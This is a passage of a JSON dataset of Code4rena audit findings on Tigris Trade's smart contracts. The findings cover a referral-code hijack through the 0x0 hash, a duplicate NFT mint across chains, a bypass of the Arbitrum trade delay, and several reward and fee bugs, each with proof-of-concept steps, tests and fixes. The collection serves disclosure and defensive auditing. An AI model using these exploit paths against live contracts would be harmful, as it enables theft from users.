it's own block. No matter what value is used for the block delay, the user can pad enough tiny transactions to allow them to close the trade immediately.\n\n### Recommended Mitigation Steps\n\nThe delay should be measured using `block.timestamp` rather than `block.number`.\n\n**[TriHaz (Tigris Trade) disputed and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/419#issuecomment-1372885915):**\n > >Once per minute the block number in the Sequencer is synced to the actual L1 block number.\n> \n> That is changed after Nitro upgrade.\n\n**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/419#issuecomment-1387095679):**\n > @TriHaz I'd like to flag this issue with the following notes:\n> block.number will return the latest synched block number from L1, this can be stale.\n> \n> Per [the docs](https://developer.offchainlabs.com/time):\n> ```\n> As a general rule, any timing assumptions a contract makes about block numbers and timestamps should be considered generally reliable in the longer term (i.e., on the order of at least several hours) but unreliable in the shorter term (minutes). (It so happens these are generally the same assumptions one should operate under when using block numbers directly on Ethereum!)\n> ```\n> \n> From a trusted Arbitrum Dev:\n> `using block.number is generally fine if you want to measure time, since that will roughly follow L1 block time`\n> \n> So ultimately this is dependent on how big or small of a delay is required.\n> \n> For minutes to hours, there seems to be no risk, while for shorter timeframes, some risk is possible.\n> \n> In terms of impact, the main impact would be that an operation that would be expected to be executed 12 seconds later, could actually be executed as rapidly as 1 or 2 seconds after (if we assume that one L2 block goes from number A to B).\n> \n> I don't think the finding can be categorized High Severity due to the reliance on settings and intentions, but at this point I believe the finding is valid and am thinking it should be of Medium Severity as it may break expectations (e.g. being able to use the same oracle price in 2 separate blocks due to unexpectedly small timestamp differences), but this is reliant on an external condition.\n> \n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/419#issuecomment-1399439675):**\n > I have also recently checked Optimism Docs, in anticipation of the Bedrock upgrade.\n> \n> Very notable warning\n> <img width=\"832\" alt=\"Screenshot 2023-01-22 at 10 32 48\" src=\"https://user-images.githubusercontent.com/13383782/213909047-2793d041-757d-4ed8-b0c0-458e86fbe582.png\">\n>\n> Source: https://community.optimism.io/docs/developers/bedrock/how-is-bedrock-different/\n> \n> Leading me to further agree with the risk involved with the finding, at this time I believe `block.timestamp` to be a better tool for all L2 integrations.\n\n**[GainsGoblin (Tigris Trade) confirmed and resolved](https://github.com/code-423n4/2022-12-tigris-findings/issues/419#issuecomment-1407767535):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419176100 \n\n\n***\n\n",
      "summary": "\nThis bug report discusses an issue with the trade delay function on Arbitrum, a layer 2 solution for Ethereum. The function, which is designed to prevent users from exploiting multiple valid prices, does not work correctly on Arbitrum. This is because the block number used in the function is not reliable on Arbitrum, as it only syncs with the main Ethereum network once per minute. This means that users can bypass the delay by opening and closing a position in the same Arbitrum block. The recommended mitigation is to use the timestamp instead of the block number in the delay function. The severity of this issue was disputed and eventually resolved by the developers of Tigris Trade, the platform where the bug was discovered. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/419",
      "tags": [],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "43158",
      "title": "[M-14] `BondNFT.sol#claim()` needs to correct all the missing epochs",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L177-L183> \n\n<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L235-L242>\n\n### Impact\n\nIn `BondNFT.sol#claim()`, `accRewardsPerShare[][]` is amended to reflect the expired shares. But only `accRewardsPerShare[bond.asset][epoch[bond.asset]]` is updated. All the epochs between `bond.expireEpoch-1` and `epoch[bond.asset]` are missed.\n\nHowever, some users claimable rewards calculation could be based on the missed epochs. As a result, the impact might be:\n\n*   `accRewardsPerShare` is inaccurate for the epochs in between.\n*   Some users could lose reward due to wrong `accRewardsPerShare`, some users might receive undeserved rewards.\n*   Some rewards will be locked in the contract.\n\n### Proof of Concept\n\nThe rationale behind the unchecked block below seems to take into account the shares of reward of the expired bond. However, if you only update the latest epoch data, the epochs in between could have errors and lead to loss of other users.\n\n```solidity\nFile: contracts/BondNFT.sol\n168:     function claim(\n169:         uint _id,\n170:         address _claimer\n171:     ) public onlyManager() returns(uint amount, address tigAsset) {\n    \n177:             if (bond.expired) {\n178:                 uint _pendingDelta = (bond.shares * accRewardsPerShare[bond.asset][epoch[bond.asset]] / 1e18 - bondPaid[_id][bond.asset]) - (bond.shares * accRewardsPerShare[bond.asset][bond.expireEpoch-1] / 1e18 - bondPaid[_id][bond.asset]);\n179:                 if (totalShares[bond.asset] > 0) {\n180:                     accRewardsPerShare[bond.asset][epoch[bond.asset]] += _pendingDelta*1e18/totalShares[bond.asset];\n181:                 }\n182:             }\n183:             bondPaid[_id][bond.asset] += amount;\n```\n\nUsers can claim rewards up to the expiry time, based on `accRewardsPerShare[tigAsset][bond.expireEpoch-1]`:\n\n```solidity\n235:     function idToBond(uint256 _id) public view returns (Bond memory bond) {\n    \n238:         bond.expired = bond.expireEpoch <= epoch[bond.asset] ? true : false;\n239:         unchecked {\n240:             uint _accRewardsPerShare = accRewardsPerShare[bond.asset][bond.expired ? bond.expireEpoch-1 : epoch[bond.asset]];\n241:             bond.pending = bond.shares * _accRewardsPerShare / 1e18 - bondPaid[_id][bond.asset];\n\n```\n\n**[TriHaz (Tigris Trade) acknowledged, but disagreed with severity and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/392#issuecomment-1377671576):**\n > Acknowledged, we cant redistribute past rewards accurately because it would cost too much gas.\n >\n> I would downgrade it to Medium risk, needs an opinion from judge.\n\n**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/392#issuecomment-1399436419):**\n > The Warden has shown how, due to how epochs are handled, some rewards could be lost unless claimed each epoch.\n> \n> Because the finding pertains to a loss of Yield, I agree with Medium Severity.\n\n**[GainsGoblin (Tigris Trade) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/392#issuecomment-1407761754):**\n > It is not feasible to update accRewardsPerShare for every epoch during which bond was expired. This issue is mitigated by the fact that anyone can release an expired bond, so the small difference in yield shouldn't affect users that much.\n\n\n\n***\n\n",
      "summary": "\nThis bug report discusses an issue with the `claim` function in the `BondNFT` contract. The function updates `accRewardsPerShare` to reflect expired shares, but only updates the latest epoch, leaving all epochs in between the expiration and current epoch unchanged. This can result in inaccurate `accRewardsPerShare` values for those epochs, potentially causing some users to lose or receive incorrect rewards and locking some rewards in the contract. A proposed solution was deemed too costly, and the severity of the bug was downgraded to medium. The team believes this issue is mitigated by the fact that expired bonds can be released by anyone.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/392",
      "tags": [],
      "finders": [
        "\\_\\_141345\\_\\_"
      ]
    },
    {
      "id": "43157",
      "title": "[M-13] One can become referral of hash 0x0 and because all users default referral hash is 0x0 so he would become all users referral by default and earn a lot of fees while users didn't approve it",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Referrals.sol#L20-L24> \n\n<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/TradingExtension.sol#L148-L152>\n\n### Impact\n\nBy default the value of `_referred[user]` is 0x0 for all users and if one set 0x0 as his referral hash then he would become referral for all the users who didn't set referral by default and he would earn a lot of referral funds that users didn't approve it.\n\n### Proof of Concept\n\nThis is `createReferralCode()` code:\n\n        function createReferralCode(bytes32 _hash) external {\n            require(_referral[_hash] == address(0), \"Referral code already exists\");\n            _referral[_hash] = _msgSender();\n            emit ReferralCreated(_msgSender(), _hash);\n        }\n\nAs you can see, attacker can become set 0x0 as his hash referral by calling `createReferralCode(0x0)` and code would set `_referral[0x0] = attackerAddress` (attacker needs to be the first one calling this).\n\nThen in the `getRef()` code the logic would return `attackerAddress` as referral for all the users who didn't set referral.\n\n        function getRef(\n            address _trader\n        ) external view returns(address) {\n            return referrals.getReferral(referrals.getReferred(_trader));\n        }\n\nIn the code, getReferred(trader) would return 0x0 because trader didn't set referred and getReferral(0x0) would return attackerAddress.\n\n`_handleOpenFees()` and `_handleCloseFees()` function in the Trading contract would use `getRef(trader)` and they would transfer referral fee to attackerAddress and attacker would receive fee from a lot of users which didn't set any referral, those users didn't set any referral and didn't approve attacker receiving referral fees from them and because most of the users wouldn't know about this and referral codes so attacker would receive a lot of funds.\n\n### Tools Used\n\nVIM\n\n### Recommended Mitigation Steps\n\nPrevent someone from setting 0x0 hash for their referral code.\n\n**[TriHaz (Tigris Trade) confirmed and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/379#issuecomment-1363604388):**\n> It is valid but I'm not 100% sure it should be a High risk. Would like an opinion from a judge.\n\n**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/379#issuecomment-1385583666):**\n > The Warden has shown how, due to an incorrect assumption, the first claimer to the 0 hash will receive referral fees for all non-referred users.\n> \n> Because the finding creates a negative externality and shows a way to extract value from what would be assumed to be the null value, I believe the finding to be of Medium Severity.\n> \n> I'd recommend the Sponsor either mitigate or set themselves as the 0 hash recipient as a way to receive default fees.\n\n**[GainsGoblin (Tigris Trade) resolved](https://github.com/code-423n4/2022-12-tigris-findings/issues/379#issuecomment-1407760281):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419175772 \n\n\n\n***\n\n",
      "summary": "\nThis bug report discusses a vulnerability found in the Tigris Trade contract, specifically in the Referrals and TradingExtension contracts. The vulnerability allows an attacker to set their referral code to 0x0, which is the default value for all users. This means that the attacker would become the referral for all users who did not set a referral code, and would earn referral funds without the users' approval. The code for creating a referral code and getting a referral does not account for this possibility, leading to the vulnerability. The recommended mitigation step is to prevent users from setting their referral code to 0x0. The severity of this bug was initially considered high, but was later decreased to medium by a judge. The sponsor has resolved the issue by implementing the recommended mitigation step.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/379",
      "tags": [],
      "finders": [
        "unforgiven"
      ]
    },
    {
      "id": "43156",
      "title": "[M-11] `_handleOpenFees` returns an incorrect value for `_feePaid`. This directly impacts margin calculations",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L178> \n\n<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L734>\n\n### Impact\n\nFormula for `fee paid` in [Line 734](https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L734) is incorrect leading to incorrect margin calculations. Since this directly impacts the trader margin and associated fee calculations, I've marked as HIGH risk.\n\nOn initiating a market order, `Margin` is adjusted for the `fees` that is charged by protocol. This adjustment is in [Line 178 of Trading](https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L178). Fees computed by ` _handleOpenFees  ` is deducted from Initial margin posted by user.\n\nFormula misses to account for the `2*referralFee` component while calculaing `_feePaid`.\n\n### Proof of Concept\n\nNote that `_feePaid` as per formula in Line 734 is the sum of ` _daoFeesPaid`, and sum of  `burnerFee`&`botFee` .  `\\_daoFeesPaid`is calculated from`\\_fees.daoFees`which itself is calculated by subtracting`2\\*referralFee`and`botFee\\`.\n\nSo when we add back `burnerFee` and `botFee` to `_feePaid`, we are missing to add back the `2*referralFee`  which was earlier excluded when calculating `_daoFeesPaid`. While `botFee` is added back correctly, same adjustment is not being done viz-a-viz referral fee.\n\nThis results in under calculating the `_feePaid` and impacts the rewards paid to the protocol NFT holders.\n\n### Recommended Mitigation Steps\n\nSuggest replacing the formula in line 734 with below (adding back `\\_fees.referralFees\\*2`)\n\n                _feePaid =\n                    _positionSize\n                    * (_fees.burnFees + _fees.botFees + _fees.referralFees*2 ) \n                    / DIVISION_CONSTANT // divide by 100%\n                    + _daoFeesPaid;\n\n**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/367#issuecomment-1408804631):**\n > The warden has shown a mistake in how fees are calculated, the impact will cause a loss of yield to the protocol, however no convincing argument was made as to how this can cause a loss to depositors or users (loss of principal), for this reason, I believe Medium Severity to be the most appropriate.\n\n**[GainsGoblin (Tigris Trade) confirmed and  commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/367#issuecomment-1426771208):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419176602 \n\n***\n\n",
      "summary": "\nThe bug report is about a mistake in the formula for calculating fees in a trading contract. This mistake can lead to incorrect margin and fee calculations, which can affect the rewards paid to the protocol's NFT holders. The suggested solution is to replace the formula in line 734 with a corrected one. The severity of the bug has been decreased to medium as it does not directly cause a loss of principal for depositors or users. The recommended mitigation step can be found in a pull request on the project's GitHub page.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/367",
      "tags": [],
      "finders": [
        "chaduke",
        "0Kage"
      ]
    },
    {
      "id": "43155",
      "title": "[M-10] `BondNFT.extendLock` force a user to extend the bond at least for current bond.period",
      "impact": "MEDIUM",
      "content": "\nThe current implementation forces a user to extend their bonds for at least they current bond period. This means that, for instance, a bond which was initially locked for 365 can never be extended, even after a week of being created.\n\nIf we consider that a bond should have at least a 7 days lock and at the most 365 days, then the current `BondNFT.extendLock` function should be refactored.\n\n### Impact\n\n*   Current `BondNFT.extendLock` function does not work as expected, forcing user who wants to extend their bond to extend them at least for their current bond.period.\n*   For bonds which were set with a lock period of 365 days, they can not be extended, even after days of their creation.\n\n### Proof of Concept\n\n```typescript\n// In 09.Bond.js,  describe \"Extending lock\"\nit(\"POC: Extending the lock does not work as expected\", async function () {\n      await stabletoken.connect(owner).mintFor(user.address, ethers.utils.parseEther(\"100\"));\n      // user lock bond funds for 10 days\n      await lock.connect(user).lock(StableToken.address, ethers.utils.parseEther(\"100\"), 10);\n\n      const fiveDaysTime = 5 * 24 * 60 * 60\n      const eightDaysTime = 8 * 24 * 60 * 60\n\n      // owner distribute rewards\n      console.log(\"User created a lock for 10 days\")\n      await stabletoken.connect(owner).mintFor(owner.address, ethers.utils.parseEther(\"10\"));\n      await bond.connect(owner).distribute(stabletoken.address, ethers.utils.parseEther(\"10\"));\n\n      // Five days pass\n      await network.provider.send(\"evm_increaseTime\", [fiveDaysTime]); // Skip 10 days\n      await network.provider.send(\"evm_mine\");\n      console.log(\"\\n5 days pass\")\n\n      // User decide to extend their lock three days, given the current implementation the user is forced to extended 13 days\n      const bondInfoBeforeExtension = await bond.idToBond(1)\n      console.log(`Bond info before extension: {period: ${bondInfoBeforeExtension.period}, expireEpoch: ${bondInfoBeforeExtension.expireEpoch}}`)\n      \n      await lock.connect(user).extendLock(1, 0, 3)\n      console.log(\"Bond was extended for 3 days\")\n      const bondInfoAfterExtension = await bond.idToBond(1)\n      console.log(`Bond info after extension: {period: ${bondInfoAfterExtension.period}, expireEpoch: ${bondInfoAfterExtension.expireEpoch}}`)\n\n      // 8 days pass, user should be able to release the bond given the extension of 3 days (8 days should be enough)\n      await network.provider.send(\"evm_increaseTime\", [eightDaysTime]);\n      await network.provider.send(\"evm_mine\");\n      console.log(\"\\n8 days later\")\n      console.log(\"After 13 days (10 original days + 3 days from extension) the user can not release the bond\")\n      \n      // The user decide to claim their part and get their bond amount\n      // The user should recieve all the current funds in the contract\n      await expect(lock.connect(user).release(1)).to.be.revertedWith('!expire')\n\n    });\n```\n\n### Recommended Mitigation Steps\n\nIn order to `extendLock` to work properly, the current implementation  should be changed to:\n\n```diff\nfunction extendLock(\n    uint _id,\n    address _asset,\n    uint _amount,\n    uint _period,\n    address _sender\n) external onlyManager() {\n    Bond memory bond = idToBond(_id);\n    Bond storage _bond = _idToBond[_id];\n    require(bond.owner == _sender, \"!owner\");\n    require(!bond.expired, \"Expired\");\n    require(bond.asset == _asset, \"!BondAsset\");\n    require(bond.pending == 0); //Cannot extend a lock with pending rewards\n+   uint currentEpoch = block.timestamp/DAY;\n-   require(epoch[bond.asset] == block.timestamp/DAY, \"Bad epoch\");\n    require(epoch[bond.asset] == currentEpoch, \"Bad epoch\");\n\n+   uint pendingEpochs = bond.expireEpoch - currentEpoch;\n+   uint newBondPeriod = pendingEpochs + _period;\n+   //In order to respect min bond period when we extend a bon\n+   // Next line can be omitted at discretion of the protocol and devs\n+   // If it is omitted any created bond would be able to be extended always (except from those with period = 365)\n+   require(newBondPeriod >= 7, \"MIN PERIOD\");\n\n-    require(bond.period+_period <= 365, \"MAX PERIOD\");\n+    require(newBondPeriod <= 365, \"MAX PERIOD\");\n    \n    unchecked {\n-       uint shares = (bond.amount + _amount) * (bond.period + _period) / 365;\n+       uint shares = (bond.amount + _amount) * newBondPeriod / 365;\n\n-       uint expireEpoch = block.timestamp/DAY + bond.period + _period;\n+       uint expireEpoch = currentEpoch + newBondPeriod;\n\n        totalShares[bond.asset] += shares-bond.shares;\n        _bond.shares = shares;\n        _bond.amount += _amount;\n        _bond.expireEpoch = expireEpoch;\n        _bond.period += _period;\n        _bond.mintTime = block.timestamp; \n-       _bond.mintEpoch = epoch[bond.asset];\n+       _bond.mintEpoch = currentEpoch;\n-       bondPaid[_id][bond.asset] = accRewardsPerShare[bond.asset][epoch[bond.asset]] * _bond.shares / 1e18;\n+       bondPaid[_id][bond.asset] = accRewardsPerShare[bond.asset][currentEpoch] * _bond.shares / 1e18;\n    }\n    emit ExtendLock(_period, _amount, _sender,  _id);\n}\n```\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/359#issuecomment-1385304841):**\n> The warden has shown that the mechanic for extending locks can cause lock duration to be longer than intended, while rewards math will behave as inputted by the user.\n> \n> While an argument for this being a user mistake could be made, I believe that in this case the demonstrated logic flaw takes precedence, that's because a user interacting with the system as intended will still be locked for longer than intended and receive less rewards for that mistake.\n> \n> For this reason (conditionality, logic flaw, no loss of principal) I believe Medium Severity to be appropriate.\n\n**[GainsGoblin (Tigris Trade) confirmed and  commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/359#issuecomment-1407758971):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419175579 \n\n\n***\n\n",
      "summary": "\nThe current implementation of the `BondNFT.extendLock` function does not work as expected. It forces users to extend their bonds for at least the current bond period, which means that a bond that was initially locked for 365 days can never be extended, even after a week of being created. This bug affects the ability of users to extend their lock periods and receive rewards as intended. A proof of concept has been provided to demonstrate this issue. To mitigate this bug, the `extendLock` function should be refactored to allow for a minimum lock period of 7 days and a maximum of 365 days. This will ensure that users can extend their lock periods as intended without any unexpected consequences.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/359",
      "tags": [],
      "finders": [
        "carlitox477"
      ]
    },
    {
      "id": "43154",
      "title": "[M-09] `safeTransferMany()` doesn't actually use safe transfer",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L247> \n\n<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L285>\n\nBoth `BondNFT` and `GovNFT` are an ERC721 implementation, and they both also have a function named `safeTransferMany()` which its name implies is supposed to safe transfer many tokens at once.\nHowever the function doesn't actually safe transfer.\n\n### Impact\n\nUsers might use this function, expecting it to verify that the receiver is an `ERC721Receiver`, but will get their funds stuck in a contract that doesn't support ERC721.\n\n### Proof of Concept\n\nI've added the following tests to the `GovNFT` tests.\n\n1st test will succeed (tx will revert) since `safeTransferFrom()` does actually use safe transfer.\n\n2nd will fail (tx won't revert), since `safeTransferMany()` doesn't actually use a safe transfer.\n\n```diff\ndiff --git a/test/05.GovNFT.js b/test/05.GovNFT.js\nindex 711a649..d927320 100644\n--- a/test/05.GovNFT.js\n+++ b/test/05.GovNFT.js\n@@ -98,6 +98,14 @@ describe(\"govnft\", function () {\n       expect(await govnft.pending(owner.getAddress(), StableToken.address)).to.equal(1500);\n       expect(await govnft.pending(user.getAddress(), StableToken.address)).to.equal(500);\n     });\n+\n+    it(\"Safe transfer to non ERC721Receiver\", async function () {\n+      \n+      expect(govnft.connect(owner)['safeTransferFrom(address,address,uint256)'](owner.address,StableToken.address, 2)).to.be.revertedWith(\"ERC721: transfer to non ERC721Receiver implementer\");\n+    });\n+    it(\"Safe transfer many  to non ERC721Receiver\", async function () {\n+      await expect(govnft.connect(owner).safeTransferMany(StableToken.address, [2])).to.be.revertedWith(\"ERC721: transfer to non ERC721Receiver implementer\");\n+    });\n     it(\"Transferring an NFT with pending delisted rewards should not affect pending rewards\", async function () {\n       await govnft.connect(owner).safeTransferMany(user.getAddress(), [2,3]);\n       expect(await govnft.balanceOf(owner.getAddress())).to.equal(0);\n\n```\n\nOutput (I've shortened the output. following test will also fail, since the successful transfer will affect them):\n\n           Safe transfer to contract\n          1) Safe transfer many to contract\n\n\n      11 passing (3s)\n      1 failing\n\n      1) govnft\n           Reward system related functions\n             Safe transfer many to contract:\n\n          AssertionError: Expected transaction to be reverted\n          + expected - actual\n\n          -Transaction NOT reverted.\n          +Transaction reverted.\n\n### Recommended Mitigation Steps\n\nCall `_safeTransfer()` instead of `_transfer()`.\n\n**[TriHaz (Tigris Trade) confirmed](https://github.com/code-423n4/2022-12-tigris-findings/issues/356)**  \n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/356#issuecomment-1382257925):**\n > The Warden has shown a discrepancy between the intent of the code and the actual functionality when it comes to the `safeTransfer...` function.\n> \n> Because this finding is reliant on understanding the intention of the Sponsor, and in this case they have confirmed, I believe that the finding is valid and of Medium Severity, because the function was intended to be using the safe checks, but wasn't.\n\n**[GainsGoblin (Tigris Trade) resolved](https://github.com/code-423n4/2022-12-tigris-findings/issues/356#issuecomment-1407533514):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419175381 \n >\n> We decided that we do not want transfers to check that the receiver is implementing IERC721Receiver, so we renamed the functions.\n\n\n\n***\n\n",
      "summary": "\nThe bug report is about two contracts, `BondNFT` and `GovNFT`, which are both ERC721 implementations. They both have a function called `safeTransferMany()` that is supposed to safely transfer multiple tokens at once. However, the function does not actually perform a safe transfer as its name implies. This means that users may use this function, expecting it to verify that the receiver is an `ERC721Receiver`, but their funds will get stuck in a contract that does not support ERC721. The report includes a proof of concept with two tests, one that will succeed and one that will fail due to the incorrect functionality of the `safeTransferMany()` function. The recommended mitigation step is to call `_safeTransfer()` instead of `_transfer()`. The bug has been confirmed by the team and resolved by renaming the functions. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/356",
      "tags": [],
      "finders": [
        "HollaDieWaldfee",
        "8olidity",
        "0xmuxyz",
        "0xA5DF",
        "0x4non"
      ]
    },
    {
      "id": "43153",
      "title": "[M-05] Failure in `endpoint` can cause minting more than one NFT with the same token id in different chains",
      "impact": "MEDIUM",
      "content": "\nIn the contract `GovNFT`, it is possible to bridge the governance NFT to other chains. It is also stated in the document that:\n\n> NFT holders only earn the profits generated by the platform on the chain that the NFT is on.\n\nIt is assumed that there is only one unique NFT per token id. But there is a scenario that can lead to more than one NFT with the same token id on different chains.\n\n### Proof of Concept\n\n*   Suppose Bob (honest user who owns an NFT with token id X on chain B) plans to bridge this NFT from chain B to chain A. So, Bob calls the function `crossChain` to bridge the NFT from chain B to chain A. Thus, his NFT will be burnt on chain B, and it is supposed to be minted on chain A.\n\n<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/GovNFT.sol#L124>\n\n*   The `endpoint` is responsible for completing  the bridging task on chain A.\n*   Suppose the `endpoint` calls the function `lzReceive` with low gas on chain A, so that the transaction will be not successful.\n\n<!---->\n\n    function lzReceive(\n            uint16 _srcChainId,\n            bytes memory _srcAddress,\n            uint64 _nonce,\n            bytes memory _payload\n        ) external override {\n            require(_msgSender() == address(endpoint), \"!Endpoint\");\n            (bool success, bytes memory reason) = address(this).excessivelySafeCall(gasleft()*4/5, 150, abi.encodeWithSelector(this.nonblockingLzReceive.selector, _srcChainId, _srcAddress, _nonce, _payload));\n            // try-catch all errors/exceptions\n            if (!success) {\n                failedMessages[_srcChainId][_srcAddress][_nonce] = keccak256(_payload);\n                emit MessageFailed(_srcChainId, _srcAddress, _nonce, _payload, reason);\n            }\n        }\n\n<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/GovNFT.sol#L168>\n\n*   Since the transaction was not successful, the message will be added as a failed message.\n\n<!---->\n\n    failedMessages[chainB][Bob's address][_nonce] = keccak256(_payload);\n\n<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/GovNFT.sol#L178>\n\n*   Then, due to network lag (or any server issue, or any failure in `endpoint`), the `endpoint` assumes that the transaction is not sent, and it again calls this function with enough gas, so, the NFT with token id X will be minted to Bob's address on chain A. The flow is as follows:\n\n`lzReceive` ==> `nonblockingLzReceive` ==> `_nonblockingLzReceive` ==> `_bridgeMint`\n\n*   Now Bob has the NFT on chain A. Moreover, he has a failed message on chain A.\n*   Then Bob calls the function `crossChain` to bridge that NFT from chain A to chain B. So, this NFT will be burnt on chain A, and minted to Bob's address on chain B.\n*   Now, Bob has the NFT with token id X on chain B. Moreover, he has a failed message on chain A.\n*   He calls the function `retryMessage` to retry the failed message on chain A.\n\n<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/GovNFT.sol#L206>\n\n*   By doing so the NFT with token id X will be minted to Bob on chain A. The flow is as follows:\n\n`retryMessage` ==> `_nonblockingLzReceive` ==> `_bridgeMint`\n\n*   Now Bob has the NFT with token id X on both chain A and chain B. This is the vulnerability.\n*   Now he can, for example, sell the NFT on chain B while he is earning the profits generated by the platform on the chain A that the NFT is on.\n*   Please note that Bob can not call the function `retryMessage` while he owns the NFT on chain A. Because during minting the NFT, it checks whether the token id exists or not. That is why Bob first bridges the NFT to another chain, and then retries the failed message.\n\n***The vulnerability is that when the message is failed, it is not considered as consumed, so in case of a failure in `endpoint` it is possible to have failed messages and be able to mint it at the same time.***\n\nPlease note that if this scenario happens again, more NFTs with the same token id X will be minted to Bob on different chains.\n\n### Recommended Mitigation Steps\n\nIt is recommended to track the consumed messages, and add a consumed flag whenever the function `lzReceive` is called, because it will either immediately mint the NFT or add it to the failed messages to be minted later.\n\n    mapping(uint16 => mapping(bytes => mapping(uint64 => bool))) public consumedMessage;\n\n        function lzReceive(\n            uint16 _srcChainId,\n            bytes memory _srcAddress,\n            uint64 _nonce,\n            bytes memory _payload\n        ) external override {\n            \n            require(!consumedMessage[_srcChainId][_srcAddress][_nonce], \"already consumed\");\n            consumedMessage[_srcChainId][_srcAddress][_nonce] = true;\n\n            require(_msgSender() == address(endpoint), \"!Endpoint\");\n            (bool success, bytes memory reason) = address(this).excessivelySafeCall(gasleft()*4/5, 150, abi.encodeWithSelector(this.nonblockingLzReceive.selector, _srcChainId, _srcAddress, _nonce, _payload));\n            // try-catch all errors/exceptions\n            if (!success) {\n                failedMessages[_srcChainId][_srcAddress][_nonce] = keccak256(_payload);\n                emit MessageFailed(_srcChainId, _srcAddress, _nonce, _payload, reason);\n            }\n        }\n\n**[GainsGoblin (Tigris Trade) confirmed](https://github.com/code-423n4/2022-12-tigris-findings/issues/150)** \n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/150#issuecomment-1387181367):**\n> The Warden has shown a flaw in the FSM in `lzReceive` that, due to an unexpected revert, could cause the ability to have the same tokenId on multiple chains.\n> \n> Because of it's reliance on external conditions, I agree with Medium Severity.\n\n**[GainsGoblin (Tigris Trade) resolved](https://github.com/code-423n4/2022-12-tigris-findings/issues/150#issuecomment-1407486546):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419174114 \n >\n> This implementation of consumedMessage check returns instead of reverts. We don't want it to revert because that would cause the message queue to be blocked.\n\n\n\n***\n\n",
